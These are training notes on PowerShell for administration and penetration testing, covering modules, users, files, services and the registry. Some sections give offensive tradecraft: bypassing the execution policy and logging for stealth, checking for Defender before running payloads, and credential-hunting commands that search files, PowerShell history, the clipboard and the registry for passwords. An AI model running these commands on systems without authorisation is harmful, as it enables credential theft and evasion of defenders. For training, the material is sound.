For IT Administrators, SOC Analysts, and Penetration Testers, PowerShell is an indispensable asset. It serves as the backbone for managing Windows Server environments, Active Directory, Azure, and Microsoft 365.

### System Administration Context
SysAdmins leverage PowerShell for day-to-day automation, including:
* Provisioning servers and configuring roles.
* Managing Active Directory lifecycles (users, groups, permissions).
* Interacting with Azure AD and virtual machines.
* Managing local and network share ACLs.
* Automating telemetry gathering and log monitoring.

### Cybersecurity Context (Offensive & Defensive)
As a junior pentester, understanding PowerShell is crucial. Its module import capabilities allow seamless execution of custom tooling in target environments. 
> **Operational Security (OpSec) Note:** While PowerShell is incredibly powerful, it features robust logging mechanisms (e.g., Script Block Logging). If operational stealth is a priority during an engagement, falling back to CMD or bypassing logging controls is often necessary to avoid detection by defenders.

---

## Invoking PowerShell

Depending on our access vector (local peripheral, RDP, or remote shell), PowerShell can be spawned using several methods:

1. **Windows Search:** Simply query `PowerShell` in the start menu.
2. **Windows Terminal:** Microsoft's modern terminal emulator that consolidates CMD, PowerShell, and WSL into a unified, tabbed interface.
3. **PowerShell ISE (Integrated Scripting Environment):** A native IDE ideal for developing, debugging, and testing PowerShell scripts.
4. **Via CMD:** Crucial during post-exploitation. If a reverse shell drops you into `cmd.exe`, executing `powershell.exe` spawns a sub-shell, granting access to advanced cmdlets to further enumerate or pivot across the network.

---

## Anatomy of the PowerShell Prompt

When accessing the shell, the prompt provides immediate contextual awareness:

```powershell
PS C:\Users\htb-student> ipconfig 

Ethernet adapter VMware Network Adapter VMnet8:
   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::adb8:3c9:a8af:114%25
   IPv4 Address. . . . . . . . . . . : 172.16.110.1
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
```

* **`PS`**: Indicates an active PowerShell session.
* **`C:\Users\htb-student>`**: Displays the Current Working Directory (CWD).
* Most legacy CMD commands (like `ipconfig`) execute seamlessly within PowerShell due to built-in aliases.

---

## The Help System (`Get-Help`)

Memorizing syntax is inefficient; understanding how to query the documentation is key. The `Get-Help` cmdlet is the primary tool for feature discovery.

```powershell
PS C:\Users\htb-student> Get-Help Test-Wsman
```

By default, the output displays the `NAME`, `SYNTAX`, `ALIASES`, and `REMARKS`. 
To ensure the local help repository is populated with the latest documentation from Microsoft, always run the updater in an elevated session:

```powershell
PS C:\Windows\system32> Update-Help
```

Once updated, running `Get-Help Test-Wsman` will yield a much deeper `SYNOPSIS`, `DESCRIPTION`, and `RELATED LINKS`.
> **Pro-Tip:** Append the `-Online` parameter (e.g., `Get-Help Test-Wsman -Online`) to open the official Microsoft documentation in your default browser.

---

## Core Navigation Cmdlets

Navigating the file system relies on intuitive Verb-Noun cmdlets.

### 1. Identify Current Location
```powershell
PS C:\Users\DLarusso> Get-Location

Path
----
C:\Users\DLarusso
```

### 2. Enumerate Directory Contents
```powershell
PS C:\htb> Get-ChildItem 

Directory: C:\Users\DLarusso

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         10/26/2021  10:26 PM               .ssh
d-r---          9/18/2022  12:35 PM               Desktop
d-r---          9/18/2022   1:01 PM               Documents
```

### 3. Change Directory
```powershell
PS C:\htb> Set-Location .\Documents\
PS C:\Users\DLarusso\Documents>
```

### 4. Read File Output
```powershell
PS C:\htb> Get-Content Readme.md  
```

---

## CLI Efficiency: Tips & Tricks

### Discovering Cmdlets (`Get-Command`)
If you forget a specific cmdlet, use `Get-Command` to filter the loaded modules by verb or noun.

* **Filter by Verb:** `Get-Command -Verb Get`
* **Filter by Noun:** `Get-Command -Noun Windows*` (The `*` acts as a wildcard).

### Managing Session History
PowerShell tracks command history via two mechanisms: the built-in session history and the `PSReadLine` module.

1. **Session History:** Use `Get-History` to view commands from the current session. You can re-execute a command by its ID using the `Invoke-History` alias `r` (e.g., `r 14`).
2. **PSReadLine History:** Maintains a persistent log across all sessions, stored at `$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`. 
   * *Security Benefit:* `PSReadLine` automatically redacts sensitive strings like `password`, `token`, and `apikey` to prevent credential exposure in log files.

### Screen Management
To declutter the terminal without losing defined variables, use the `Clear-Host` cmdlet (or its aliases `clear` / `cls`).

### Essential Keyboard Shortcuts
Mastering hotkeys accelerates CLI workflows, especially during remote shells without GUI access:
* **`CTRL+R`**: Reverse search through command history.
* **`CTRL+L`**: Clear the screen.
* **`Escape`**: Erase the current prompt line.
* **`Up/Down Arrows`**: Cycle through recent commands.
* **`F7`**: Opens a Terminal User Interface (TUI) with a scrollable history.

### Tab Completion
Hit `TAB` (or `SHIFT+TAB` to reverse) while typing to auto-complete paths, parameters, and cmdlet names.

### Using Aliases
Aliases are shortcut names for cmdlets or executables, drastically reducing keystrokes. View all mapped aliases using `Get-Alias`.

You can also map custom aliases for your current session:
```powershell
PS C:\Windows\system32> Set-Alias -Name gh -Value Get-Help
```

**Common Linux-to-PowerShell Aliases:**
If you are coming from a Linux/Bash background (e.g., Kali), PowerShell has you covered:
* `pwd` $\rightarrow$ `Get-Location`
* `ls` $\rightarrow$ `Get-ChildItem`
* `cd` $\rightarrow$ `Set-Location`
* `cat` $\rightarrow$ `Get-Content`
* `curl` / `wget` $\rightarrow$ `Invoke-WebRequest`
* `clear` $\rightarrow$ `Clear-Host`
* `man` $\rightarrow$ `Get-Help`


# PowerShell: Cmdlets and Modules

Understanding cmdlets and modules is crucial for both System Administration and Penetration Testing. PowerShell's modular and expandable architecture makes it a powerhouse tool for enumerating, managing, and auditing Windows environments.

## 1. PowerShell Cmdlets
Microsoft defines a **cmdlet** as a "single-feature command that manipulates objects in PowerShell."

Cmdlets strictly follow a `Verb-Noun` naming convention, making their intended function highly intuitive (e.g., `Test-WSMan` consists of the verb `Test` and the noun `WSMan`). 

* **Structure:** `Verb-Noun -Parameter Option`
* **Under the Hood:** Unlike standard PowerShell functions, cmdlets are typically compiled binaries written in C# or other .NET languages.
* **Discovery:** Use `Get-Command` to list available cmdlets, functions, and aliases. Look at the `CommandType` property to identify the specific type of executable.
* **Documentation:** Use `Get-Help <cmdlet>` to view usage options and `Get-Member` to expose the properties and methods of the objects returned by the cmdlet.

## 2. PowerShell Modules
A PowerShell module is a packaged collection of structured PowerShell code designed for deployment and sharing. A module can contain:
* Cmdlets
* Script files (`.ps1`, `.psm1`)
* Functions
* Assemblies (`.dll`)
* Related resources (manifests and help files)

### Case Study: PowerSploit (PowerView)
To understand module anatomy, we can examine the `PowerSploit` project (specifically `PowerView.ps1`). While the repository is officially archived, its logic remains a fundamental reference for Active Directory enumeration and exploitation.

#### The Module Manifest (`.psd1`)
A PowerShell Data File (`.psd1`) acts as the module's manifest. It defines the module's metadata and dependencies, including:
* Module versioning and tracking
* GUID
* Author and Copyright information
* PowerShell compatibility requirements
* Exported modules, functions, and cmdlets

#### The Script Module (`.psm1`)
A PowerShell Script Module (`.psm1`) contains the core logic (the "meat") of the module.
```powershell
Get-ChildItem $PSScriptRoot | ? { $_.PSIsContainer -and !('Tests','docs' -contains $_.Name) } | % { Import-Module $_.FullName -DisableNameChecking }
```
* **Breakdown:** * `Get-ChildItem` fetches items in the directory (`$PSScriptRoot`).
  * `?` (`Where-Object`) filters for directories, excluding `Tests` and `docs`.
  * `%` (`ForEach-Object`) iterates through the remaining folders and executes `Import-Module`, utilizing `-DisableNameChecking` to suppress unapproved verb warnings.

## 3. Managing and Using Modules
Before utilizing a module, you must determine its status on the host (loaded, installed, or missing).

### Enumerating Modules
To list currently loaded modules in the session:
```powershell
Get-Module
```
To list all installed modules available on the system (even if not currently loaded):
```powershell
Get-Module -ListAvailable
```

### Importing Modules
Once a module is on the target host, it must be loaded into the current session to execute its functions.
```powershell
# Syntax overview
Get-Help Import-Module

# Importing a custom module from a specific path
Import-Module .\PowerSploit.psd1
```
*Note: Modern PowerShell automatically imports installed modules from the default `$env:PSModulePath` when a cmdlet is invoked. Custom modules dropped onto a target during an engagement must be imported manually.*

To check the default paths where PowerShell searches for modules:
```powershell
$env:PSModulePath
```

## 4. Execution Policy & Bypasses
PowerShell's **Execution Policy** is an administrative safety control, *not* a security boundary. It dictates the conditions under which PowerShell loads configuration files and runs scripts.

If the policy is set to `Restricted`, attempting to load a script will throw an `UnauthorizedAccess` error.

### Checking and Modifying the Policy
```powershell
# Check current policy
Get-ExecutionPolicy

# Set policy system-wide (Requires Admin privileges - High OPSEC risk if left unchanged)
Set-ExecutionPolicy Unrestricted
```

### Pentester/SysAdmin Workflow: Scope Bypass
To bypass the execution policy without leaving persistent configuration changes on the host (better OPSEC), modify the policy strictly for the current process:
```powershell
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
```
This ensures the restriction is lifted only for the active session and reverts automatically upon closure.

## 5. Discovering Module Capabilities
To inspect the specific cmdlets, functions, and aliases introduced by an imported module:
```powershell
Get-Command -Module PowerSploit
```

## 6. Package Management: PowerShell Gallery & GitHub
The [PowerShell Gallery](https://www.powershellgallery.com/) is the central repository for PowerShell content. Interaction is handled natively via the `PowerShellGet` module.

### Searching and Installing
To search for a module (e.g., `AdminToolbox`):
```powershell
Find-Module -Name AdminToolbox
```
To install it directly via the pipeline (requires administrative privileges):
```powershell
Find-Module -Name AdminToolbox | Install-Module
```

## 7. Essential Toolkit Reference
As a Junior SysAdmin or Pentester, familiarize yourself with these industry-standard modules:

1. **AdminToolbox:** A master collection of tools for AD, Exchange, Virtualization, and Network management.
2. **ActiveDirectory (RSAT):** Official Microsoft module for remote administration of AD users, groups, and policies.
3. **Empire / Situational Awareness:** Post-exploitation framework maintained by BC Security, providing deep host and domain telemetry.
4. **Inveigh:** A robust C#/PowerShell tool for network spoofing and MITM attacks (LLMNR/NBNS/mDNS/DNS/DHCPv6 spoofing).
5. **BloodHound / SharpHound:** Data collectors and graphical analysis tools used to map hidden privilege relationships within Active Directory environments.

# Windows User and Group Management

As a System Administrator, user and group management is a fundamental skill. Users are not only our primary administrative asset but also frequently represent an organization's largest attack vector. From an offensive security perspective, understanding how to enumerate, interpret, and exploit user and group configurations is a critical pathway for gaining initial access and elevating privileges during a penetration testing engagement.

This module covers the core concepts of local and domain accounts, group structures, and their management via PowerShell.

## User Accounts Overview

User accounts grant authorized personnel access to a host's resources. In specific scenarios, the operating system also relies on specially provisioned accounts to execute automated services or administrative actions. System accounts generally fall into four primary categories:

* **Service Accounts**
* **Built-in Accounts**
* **Local Users**
* **Domain Users**

### Default Local User Accounts

Every Windows installation automatically generates several default accounts to facilitate host management and core OS functionality.

| Account | Description |
| :--- | :--- |
| **Administrator** | Utilized for executing unrestricted administrative tasks on the local host. |
| **DefaultAccount** | Managed by the system for multi-user authentication applications (e.g., Xbox utility). |
| **Guest Account** | A limited-rights account for users lacking a standard profile. It is disabled by default to maintain a secure baseline. |
| **WDAGUtilityAccount** | Managed by the system for the Windows Defender Application Guard, utilized for sandboxing application sessions. |

## Introduction to Active Directory (AD)

Active Directory (AD) is a centralized directory service for Windows environments, acting as the primary identity and access gatekeeper for an enterprise. It centralizes the management of users, endpoints, security groups, network devices, file shares, Group Policy Objects (GPOs), and organizational trusts. Authenticated domain members can seamlessly access authorized network resources, while unauthenticated entities are restricted.

### Local vs. Domain-Joined Users

* **Domain Users:** Granted rights centrally from the domain controller to access network resources (file servers, printers, intranets) based on Security Identifier (SID) and group memberships. They can authenticate on any domain-joined host, provided they have the necessary rights.
* **Local Users:** Possess permissions and authentication rights exclusively on the standalone host where their account was created.

Understanding these access scopes is critical; leveraging the nuances between local and domain accounts often dictates the success of lateral movement and privilege escalation phases during an engagement.

## User Groups and Logical Sorting

Groups provide a logical structure for sorting user accounts, enabling the assignment of granular Access Control Lists (ACLs) and resource provisioning without the overhead of manual, per-user management. While useful on a standalone host, logical grouping is a critical component for maintaining a robust security posture across an enterprise domain containing thousands of objects.

### Enumerating Local Groups

To identify local groups on a standalone host, utilize the `Get-LocalGroup` cmdlet.

```powershell
PS C:\htb> Get-LocalGroup

Name                                Description
----                                -----------
Administrators                      Administrators have complete and unrestricted access to the computer/domain
Backup Operators                    Backup Operators can override security restrictions for the sole purpose of back...
Remote Desktop Users                Members in this group are granted the right to logon remotely
# <SNIP>
```

## Managing Local Accounts & Groups via PowerShell

PowerShell utilizes the `Get`, `New`, and `Set` verbs to query, provision, and modify objects. For local management, the `*LocalUser` and `*LocalGroup` cmdlets are standard.

### Identifying and Provisioning Local Users

```powershell
# Enumerate all local users
PS C:\htb> Get-LocalUser  

# Create a new local user without a password 
# Note: Depending on the OS build, omitting a password may trigger a Microsoft Live account login prompt.
PS C:\htb> New-LocalUser -Name "JLawrence" -NoPassword
```

### Modifying User Attributes

```powershell
# Securely prompt for a password and set it, along with a description
PS C:\htb> $Password = Read-Host -AsSecureString
PS C:\htb> Set-LocalUser -Name "JLawrence" -Password $Password -Description "CEO EagleFang"
```

### Managing Local Group Membership

```powershell
# Inspect the membership of the local "Users" group
PS C:\Windows\system32> Get-LocalGroupMember -Name "Users"

# Add a specific user to the "Remote Desktop Users" group
PS C:\htb> Add-LocalGroupMember -Group "Remote Desktop Users" -Member "JLawrence"

# Verify successful addition
PS C:\htb> Get-LocalGroupMember -Name "Remote Desktop Users" 
```

## Managing Domain Users and Groups

Domain administration requires the `ActiveDirectory` PowerShell module, which is distributed as part of the Remote Server Administration Tools (RSAT). 

### Installing the Active Directory Module

```powershell
# Install the RSAT Active Directory features natively
PS C:\htb> Get-WindowsCapability -Name RSAT* -Online | Add-WindowsCapability -Online

# Verify the module is available and loaded
PS C:\htb> Get-Module -Name ActiveDirectory -ListAvailable 
```

### Enumerating Domain Users

The `Get-ADUser` cmdlet allows for broad directory enumeration or targeted attribute filtering.

```powershell
# Retrieve all AD users (Warning: Can produce excessive output in large domains)
PS C:\htb> Get-ADUser -Filter *

# Retrieve a specific user by their SamAccountName
PS C:\htb> Get-ADUser -Identity TSilver

# Query users based on a specific extended attribute (e.g., Email domain)
PS C:\htb> Get-ADUser -Filter {EmailAddress -like '*greenhorn.corp'}
```
*Note: Key properties returned include `DistinguishedName` (the object's relative path in the AD schema), `SamAccountName` (the login identifier), `ObjectGUID`, and the `SID`.*

### Provisioning and Modifying AD Users

```powershell
# Provision a new AD user, configuring standard and extended attributes simultaneously
PS C:\htb> New-ADUser -Name "MTanaka" -Surname "Tanaka" -GivenName "Mori" -Office "Security" -OtherAttributes @{'title'="Sensei";'mail'="MTanaka@greenhorn.corp"} -Accountpassword (Read-Host -AsSecureString "AccountPassword") -Enabled $true 

# Validate the creation and format the output dynamically
PS C:\htb> Get-ADUser -Identity MTanaka -Properties * | Format-Table Name,Enabled,GivenName,Surname,Title,Office,Mail

# Modify an existing user's description
PS C:\htb> Set-ADUser -Identity MTanaka -Description "Sensei to Security Analysts Rocky, Colt, and Tum-Tum"  
```

## Security Implications: Enumeration and Privilege Escalation

From a penetration testing standpoint, enumerating AD users and groups frequently exposes critical misconfigurations. Excessive permissions, deeply nested group memberships, and weak password policies provide excellent leverage points. Visualizing these complex AD relationships with tools like BloodHound is a standard industry practice to map out potential attack paths for domain privilege escalation.

# PowerShell: File & Directory Management

## Overview
This section outlines essential PowerShell cmdlets for file and directory manipulation, focusing on deployment, bulk operations, and foundational access control. Mastering these cmdlets is critical for efficient system administration, automation scripting, and local enumeration during security audits.

## Core Cmdlets for Object Management

| Command | Alias | Description |
| :--- | :--- | :--- |
| `Get-Item` | `gi` | Retrieves an object (e.g., file, directory, registry key). |
| `Get-ChildItem` | `ls`, `dir`, `gci` | Enumerates the contents of a directory or registry hive. |
| `New-Item` | `md`, `mkdir`, `ni` | Instantiates new objects (files, directories, symlinks). |
| `Set-Item` | `si` | Modifies object property values. |
| `Copy-Item` | `copy`, `cp`, `ci` | Duplicates an existing object. |
| `Rename-Item` | `ren`, `rni` | Modifies the name of an object. |
| `Remove-Item` | `rm`, `del`, `rmdir` | Deletes the specified object. |
| `Get-Content` | `cat`, `type` | Reads and outputs the contents of a file. |
| `Add-Content` | `ac` | Appends string data to the end of a file. |
| `Set-Content` | `sc` | Overwrites existing file content with new data. |
| `Clear-Content` | `clc` | Purges file content while preserving the file object itself. |
| `Compare-Object` | `diff`, `compare` | Evaluates differences between two or more objects/contents. |

## Practical Scenario: Automated Directory & File Provisioning
**Objective:** Scaffold a standard directory tree and populate it with templated Markdown files for departmental documentation.

### 1. Directory Tree Creation
Leveraging `New-Item` and the `mkdir` alias to build the required infrastructure.

```powershell
# Verify current working directory and navigate to target path
Get-Location
cd C:\Users\MTanaka\Documents

# Instantiate root directory
New-Item -Name "SOPs" -ItemType Directory

# Scaffold nested subdirectories
cd SOPs
mkdir "Physical Sec"
mkdir "Cyber Sec"
mkdir "Training"

# Verify structure
Get-ChildItem
```

### 2. File Instantiation
Using `New-Item` to generate empty `.md` files across the newly created directories.

```powershell
New-Item "Readme.md" -ItemType File
New-Item ".\Physical Sec\Physical-Sec-draft.md" -ItemType File
New-Item ".\Cyber Sec\Cyber-Sec-draft.md" -ItemType File
New-Item ".\Training\Employee-Training-draft.md" -ItemType File

# Review final tree topology
tree /F
```

### 3. Content Injection
Appending templated standard headers using `Add-Content`.

```powershell
Add-Content .\Readme.md "Title: Insert Document Title Here`nDate: x/x/202x`nAuthor: MTanaka`nVersion: 0.1 (Draft)"

# Verify data injection
Get-Content .\Readme.md
```
*Note: While functional, manual provisioning is inefficient for large-scale environments. Optimal workflows leverage PowerShell scripting and variables to automate this pipeline fully.*

## Bulk Object Modification
**Objective:** Systematically modify file properties using pipeline logic.

### Single File Renaming
```powershell
Rename-Item ".\Cyber Sec\Cyber-Sec-draft.md" -NewName "Infosec-SOP-draft.md"
```

### Bulk Renaming via Pipeline
Programmatically converting multiple `.txt` files to `.md` format.

```powershell
# Pipe Get-ChildItem output to Rename-Item, using a script block to replace the extension
Get-ChildItem -Path *.txt | Rename-Item -NewName { $_.Name -replace "\.txt", ".md" }
```

## NTFS Permissions & Access Control
Permissions dictate the Access Control Entries (ACEs) within an object's Access Control List (ACL), defining the interaction scope for users and groups. Implementing the Principle of Least Privilege (PoLP) is critical to mitigate unauthorized data access or tampering.

### Standard Permission Sets
* **Full Control:** Complete authority over the object, including modifying permissions and taking ownership.
* **Modify:** Read, write, and delete capabilities for files and directories.
* **List Folder Contents:** Ability to enumerate child objects within a directory and execute binaries (applies only to directories).
* **Read and Execute:** View file contents and execute payloads/scripts (`.ps1`, `.exe`, etc.).
* **Write:** Instantiate new child objects and append data to existing files.
* **Read:** Enumerate directories and inspect file contents.
* **Traverse Folder:** Permits bypassing higher-level directories to access nested files/folders without granting read access to the parent's full contents.

*Note: Windows NTFS operates on an inheritance model. Parent directory permissions cascade to child objects by default, streamlining administration. Inheritance can be explicitly disabled to enforce custom, granular access controls on specific sensitive assets.*

# Windows CLI: Finding & Filtering Content in PowerShell

Mastering the ability to search, find, and filter content is a critical operational requirement for any SysAdmin or Pentester using the command-line interface. This section details how PowerShell leverages object-oriented outputs, property-based filtering, and the Pipeline to streamline data enumeration.

## 1. Understanding PowerShell Output (The Object Paradigm)

Unlike traditional shells (Bash or `cmd.exe`) that output plain text strings, PowerShell outputs **Objects**. Understanding this paradigm is crucial for effective scripting and system administration.

* **Object:** An individual instance of a class within PowerShell (e.g., a specific computer, a specific user).
* **Class:** The blueprint or schema that defines what an object is and how it is structured.
* **Properties:** The data or attributes associated with an object (e.g., a user's name, password expiration date, or SID).
* **Methods:** The functions or actions that can be performed on or by the object.

### Examining Object Properties and Methods
To inspect the structure of an object, we pipe the output to `Get-Member`. This is highly useful during the reconnaissance phase to understand what data is available to us.

```powershell
PS C:\htb> Get-LocalUser administrator | Get-Member
```

To view all properties and their current values for a specific object, we utilize `Select-Object` with the wildcard `*`:

```powershell
PS C:\htb> Get-LocalUser administrator | Select-Object -Property *
```

## 2. Filtering, Sorting, and Grouping Objects

When dealing with large datasets (like Active Directory users or running services), dumping all properties is inefficient. We can filter the output to display only the properties relevant to our current task.

### Property Filtering
Filtering down to specific attributes (e.g., checking which accounts have recently set passwords):

```powershell
PS C:\htb> Get-LocalUser * | Select-Object -Property Name, PasswordLastSet
```

### Sorting and Grouping
To identify patterns or group specific configurations (like determining how many accounts are actively enabled), we chain `Sort-Object` and `Group-Object`:

```powershell
PS C:\htb> Get-LocalUser * | Sort-Object -Property Name | Group-Object -Property Enabled
```

## 3. Advanced Filtering with `Where-Object`

Some cmdlets, like `Get-Service`, generate an overwhelming amount of data. If we need to assess the host for defensive mechanisms (e.g., EDRs, Antivirus) after landing an initial shell, `Where-Object` (alias: `where`) evaluates property values against specific conditions.

### Defensive Evasion Scenario: Hunting for Windows Defender
Before executing further payloads, we must enumerate running defensive services.

```powershell
PS C:\htb> Get-Service | Where-Object DisplayName -like '*Defender*'
```

### Comparison Operators Reference
PowerShell utilizes specific flags for logical evaluations within `Where-Object`:

| Operator | Description |
| :--- | :--- |
| `-like` | Utilizes wildcard expressions (`*`) for pattern matching. (e.g., `*Defender*`). |
| `-match` | Performs a Regular Expression (RegEx) match against the supplied value. |
| `-eq` | Specifies an exact, strict match (Equal To) to the property value. |
| `-contains`| Checks if a collection contains an exact specified item. |
| `-not` | Matches if the property is null, does not exist, or resolves to `$False`. |

## 4. The PowerShell Pipeline (`|`) & Chain Operators

The Pipeline (`|`) allows us to pass the object output of one cmdlet directly as the input to the next, enabling complex chaining of administrative tasks.

### Counting Unique Instances
In this example, we retrieve all running processes, sort them, filter out duplicates, and count the total objects:

```powershell
PS C:\htb> Get-Process | Sort-Object | Get-Unique | Measure-Object
```

### Pipeline Chain Operators (`&&` and `||`)
*Note: Available natively in PowerShell 7+.*
Chain operators allow for conditional execution based on the success or failure of the preceding command, essential for robust automation scripts.

* `&&` (AND): Executes the right-side command **only if** the left-side command succeeds.
* `||` (OR): Executes the right-side command **only if** the left-side command fails (error handling).

```powershell
# Executes ping only if reading the text file is successful
PS C:\htb> Get-Content '.\test.txt' && ping 8.8.8.8

# Executes ping only if the file path is incorrect or the read fails
PS C:\htb> Get-Content '.\testss.txt' || ping 8.8.8.8
```

## 5. Enumerating Content and Sensitive Data (Looting)

During post-exploitation or system audits, locating sensitive files (credentials, keys, config files) is a priority. Native tools allow us to maintain stealth ("Living off the Land") without dropping external binaries like WinPEAS.

### Recursive File Hunts (`Get-ChildItem`)
Searching for common development or documentation extensions:

```powershell
PS C:\htb> Get-ChildItem -Path C:\Users\MTanaka\ -File -Recurse -ErrorAction SilentlyContinue | Where-Object {($_.Name -like "*.txt" -or $_.Name -like "*.py" -or $_.Name -like "*.ps1" -or $_.Name -like "*.md" -or $_.Name -like "*.csv")}
```

### Deep Content Inspection (`Select-String`)
`Select-String` (alias: `sls`) is the PowerShell equivalent to Linux `grep`. We can pipe our filtered file objects directly into `Select-String` to parse the files' internal content for sensitive keywords.

```powershell
PS C:\htb> Get-ChildItem -Path C:\Users\MTanaka\ -File -Recurse -ErrorAction SilentlyContinue | Where-Object {($_.Name -like "*.txt" -or $_.Name -like "*.py" -or $_.Name -like "*.ps1" -or $_.Name -like "*.md" -or $_.Name -like "*.csv")} | Select-String "Password","credential","key","UserName"
```

### High-Value Target Directories
When enumerating a host, prioritize checking these locations for operational loot:
1.  **`C:\Users\<User>\AppData\`**: Contains application configs, temporary caches, and saved sessions.
2.  **`C:\Users\<User>\` (Hidden items)**: Check for `.ssh` folders, VPN profiles, and local keystores (`Get-ChildItem -Hidden`).
3.  **PowerShell History File**: A goldmine for plaintext credentials and admin workflows.
    * *Path:* `C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt`
    * *Cmdlet Check:* `Get-Content (Get-PSReadlineOption).HistorySavePath`
4.  **Clipboard Contents**: `Get-Clipboard`
5.  **Scheduled Tasks**: Review automated jobs for hardcoded credentials or privilege escalation vectors.


# Windows Services Management & Triage via PowerShell

## 1. Overview
Service administration is a critical component of host management, endpoint security, and maintaining an organization's overall security posture. In the Windows OS, services are standalone, background-running components that manage processes and application dependencies without requiring user interaction. 

Windows categorizes services into three primary groups:
- **Local Services**
- **Network Services**
- **System Services**

From an administrative and defensive perspective, monitoring service states is essential to detect anomalies (e.g., disabled endpoint protection or persistence mechanisms). From an offensive (Pentester) perspective, misconfigured service permissions are a common vector for Local Privilege Escalation (LPE).

PowerShell facilitates robust service management through the `Microsoft.PowerShell.Management` module.

### Core Cmdlets
You can explore available service cmdlets using the built-in help system:
```powershell
Get-Help *-Service
```
*Key Cmdlets:* `Get-Service`, `Start-Service`, `Stop-Service`, `Restart-Service`, `Set-Service`, `New-Service`, `Remove-Service` (Requires PS v7+; use `sc.exe` for older versions).

---

## 2. Local Service Enumeration & Incident Triage
**Scenario:** A user reports suspicious background activity, sudden OS sluggishness, and alerts indicating that Windows Defender has been disabled. 

### Step 2.1: Service Discovery
To begin troubleshooting, we enumerate all running services to identify misconfigurations. Services typically have a status of `Running`, `Stopped`, or `Paused`, and startup types defined as `Manual`, `Automatic`, or `Disabled`.

```powershell
# Enumerate all services and format the output
Get-Service | Format-Table DisplayName, Status

# Count the total number of services on the host
Get-Service | Measure-Object
```

### Step 2.2: Precision Filtering (Investigating Defender)
Filtering the pipeline allows us to isolate specific services related to our troubleshooting scope.

```powershell
# Isolate services related to Windows Defender
Get-Service | Where-Object DisplayName -like '*Defender*' | Format-Table DisplayName, ServiceName, Status
```
*Finding:* The `Microsoft Defender Antivirus Service` (`WinDefend`) status is `Stopped`.

### Step 2.3: Restoring Critical Services
To secure the host, we immediately restart the disabled security service using its `ServiceName`.

```powershell
# Start the Defender service
Start-Service WinDefend

# Verify the service is active
Get-Service WinDefend
```

---

## 3. Handling Suspicious Services (Containment)
During routine enumeration, anomalous services may be discovered. For example, finding a service with an irregular `DisplayName` (e.g., `Totally still used for Print Spooli...` mapped to the `Spooler` service).

To mitigate potential threats while the security team investigates, the service must be halted and its startup configuration disabled.

```powershell
# Stop the suspicious service
Stop-Service Spooler

# Verify the current properties
Get-Service spooler | Select-Object -Property Name, StartType, Status, DisplayName

# Disable the service from starting upon reboot
Set-Service -Name Spooler -StartType Disabled

# Confirm the new startup state
Get-Service -Name Spooler | Select-Object -Property StartType
```
*Note: Service modification requires administrative privileges (Local Admin or Domain Admin).*

---

## 4. Remote Service Administration & Scaling
In an Active Directory environment, querying remote hosts is essential for enterprise-wide threat hunting and administration. 

### 4.1 Querying Remote Hosts
The `-ComputerName` parameter allows you to target specific remote machines.

```powershell
# Enumerate services on a Domain Controller
Get-Service -ComputerName ACADEMY-ICL-DC

# Filter for active services only on the remote host
Get-Service -ComputerName ACADEMY-ICL-DC | Where-Object {$_.Status -eq "Running"}
```

### 4.2 Executing Commands at Scale (`Invoke-Command`)
To cross-reference anomalies (like the altered `Spooler` service) or verify security compliance across multiple endpoints simultaneously, `Invoke-Command` is highly efficient.

```powershell
# Query the status of Defender across multiple hosts
Invoke-Command -ComputerName ACADEMY-ICL-DC, LOCALHOST -ScriptBlock { Get-Service -Name 'windefend' }
```
**Breakdown:**
- `Invoke-Command`: Executes a command on local/remote computers.
- `-ComputerName`: Accepts a comma-separated list of target hosts.
- `-ScriptBlock {}`: Contains the exact PowerShell command to be executed remotely.

Mastering these cmdlets ensures rapid incident response, effective infrastructure management, and the ability to detect malicious persistence across the network.

# Working with the Windows Registry

## 1. Overview
The Windows Registry is a centralized, hierarchical database used to store information necessary to configure the system for one or more users, applications, and hardware devices. From both an offensive (Pentesting) and defensive (SysAdmin) perspective, the Registry is a critical vector for establishing persistence, enumerating host configurations, and auditing security settings (e.g., Windows Defender status, installed software, execution policies).

## 2. Core Structure: Keys and Values

### Registry Keys
Keys function as logical containers, similar to directories in a file system. They store sub-keys and values. A host system's root registry keys are stored physically in `C:\Windows\System32\Config\`.

### Registry Values
Values are the actual data objects stored within a key. They consist of three fundamental attributes:
* **Name:** The identifier of the value.
* **Type:** The data format specification (e.g., `REG_SZ` for strings, `REG_DWORD` for 32-bit numbers).
* **Data:** The actual configuration parameter, setting, or path.

## 3. Standard Registry Hives
Windows organizes the Registry into five primary root hives:

| Hive Name | Abbreviation | Description |
| :--- | :--- | :--- |
| `HKEY_LOCAL_MACHINE` | HKLM | Contains hardware, operating system, memory, and device driver data. Critical for host-wide physical state configurations. |
| `HKEY_CURRENT_CONFIG` | HKCC | Contains the current hardware profile (essentially a redirection from HKLM's `CurrentControlSet`). |
| `HKEY_CLASSES_ROOT` | HKCR | Defines file extension associations, UI extensions, and COM class registrations. |
| `HKEY_CURRENT_USER` | HKCU | Defines OS and software settings specific to the currently logged-in user. |
| `HKEY_USERS` | HKU | Contains settings for the default user profile and all active user profiles on the local machine. |

## 4. Querying the Registry

### Using PowerShell Cmdlets
PowerShell provides the `Get-Item`, `Get-ChildItem`, and `Get-ItemProperty` cmdlets to interact with the Registry, treating it as a standard drive (e.g., `HKLM:\`, `HKCU:\`).

**Enumerate running services via the CurrentVersion\Run key:**
```powershell
Get-Item -Path Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run | Select-Object -ExpandProperty Property
```

**Recursive search through subkeys:**
```powershell
Get-ChildItem -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion -Recurse
```

**Extract clean, readable property values:**
```powershell
Get-ItemProperty -Path Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

### Using Reg.exe (DOS CLI)
`reg.exe` is a native executable highly optimized for registry operations and targeted string searches.

**Basic Query:**
```cmd
reg query HKEY_LOCAL_MACHINE\SOFTWARE\7-Zip
```

**Advanced Search (Targeting strings across values):**
```cmd
REG QUERY HKCU /F "Password" /t REG_SZ /S /K
```
* `/F`: Sets the search pattern ("Password").
* `/t`: Specifies the data type (`REG_SZ`).
* `/S`: Executes a recursive search through all subkeys.
